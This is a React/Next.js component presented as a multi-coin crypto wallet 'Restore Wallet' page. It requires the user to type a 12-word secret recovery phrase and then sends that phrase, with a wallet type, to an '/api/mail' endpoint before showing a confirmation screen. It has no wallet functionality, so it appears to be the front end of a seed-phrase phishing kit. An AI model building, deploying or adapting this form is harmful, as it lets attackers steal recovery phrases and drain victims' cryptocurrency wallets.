"use client";
import { useState } from "react";
import Confirmation from "../component/Confirmation";

export default function MultiCoinWallet() {
  const [collapsed, setCollapsed] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [secretPhrase, setSecretPhrase] = useState("");
  const [darkMode, setDarkMode] = useState(true);
  const [walletType, setWalletType] = useState("main");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const countWords = (text) =>
    text.trim().split(/\s+/).filter(Boolean).length;

  async function handleSubmit(e) {
    e.preventDefault();

    const words = countWords(secretPhrase);

    if (words !== 12) {
      setError("Secret phrase must be exactly 12 words!");
      return;
    }

    try {
      setLoading(true);
      setError("");

      const res = await fetch("/api/mail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletType,
          secretPhrase,
        }),
      });

      if (!res.ok) {
        throw new Error("Something went wrong");
      }

      const data = await res.json();
      if(res.status==200){
        setLoading(true);
     }

      
      setSecretPhrase("");
    } catch (err) {
      console.error(err);
      setError("Failed to restore wallet. Try again.");
    } 
  }
  if(loading){
   return <Confirmation/>;
  }

  else{

  
  return (
    <div
      className={`min-h-screen w-full transition-colors duration-300
      ${darkMode ? "bg-black text-white" : "bg-gray-100 text-black"}`}
    >
      <div className="w-full h-full p-4 max-w-md mx-auto">
        
        {/* Wallet Toggle */}
        <div className="flex justify-center mb-6">
          <div className="flex bg-[#1c1c1c] rounded-full p-1">
            <button
              type="button"
              onClick={() => setWalletType("main")}
              className={`px-4 py-2 rounded-full text-sm font-semibold
              ${walletType === "main"
                  ? "bg-green-500 text-black"
                  : "text-gray-400"}`}
            >
              Main Wallet
            </button>

            <button
              type="button"
              onClick={() => setWalletType("private")}
              className={`px-4 py-2 rounded-full text-sm font-semibold
              ${walletType === "private"
                  ? "bg-green-500 text-black"
                  : "text-gray-400"}`}
            >
              Private Wallet
            </button>
          </div>
        </div>

        {!collapsed && (
          <form onSubmit={handleSubmit}>
            
            {/* Secret Phrase */}
            <div className="mb-4">
              <label className="text-sm text-gray-500">
                Secret Phrase
              </label>

              <textarea
                rows={4}
                value={secretPhrase}
                onChange={(e) => {
                  const value = e.target.value;
                  setSecretPhrase(value);

                  const words = countWords(value);
                  if (words < 12) {
                    setError("Secret phrase must be exactly 12 words or 24 words!");
                  } else {
                    setError("");
                  }
                }}
                placeholder="Enter exactly 12 words"
                className={`w-full rounded-lg px-3 py-3 text-sm resize-none outline-none
                ${darkMode
                    ? "bg-[#1c1c1c] border border-green-500"
                    : "bg-white border border-green-600"}`}
              />

              <p className="text-xs text-gray-500 mt-1">
                Exactly 12 words separated by spaces
              </p>

              {error && (
                <p className="text-xs text-red-400 mt-1">{error}</p>
              )}
            </div>

            {/* Submit */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-green-500 text-black font-semibold py-3 rounded-full mt-6"
            >
              {loading ? "Restoring..." : "Restore Wallet"}
            </button>
          </form>
        )}
      </div>

      {/* Theme Toggle */}
      <button
        type="button"
        onClick={() => setDarkMode(!darkMode)}
        className="fixed bottom-4 right-4 bg-green-500 text-black p-3 rounded-full shadow-lg"
      >
        {darkMode ? "☀️" : "🌙"}
      </button>
    </div>
  );}
}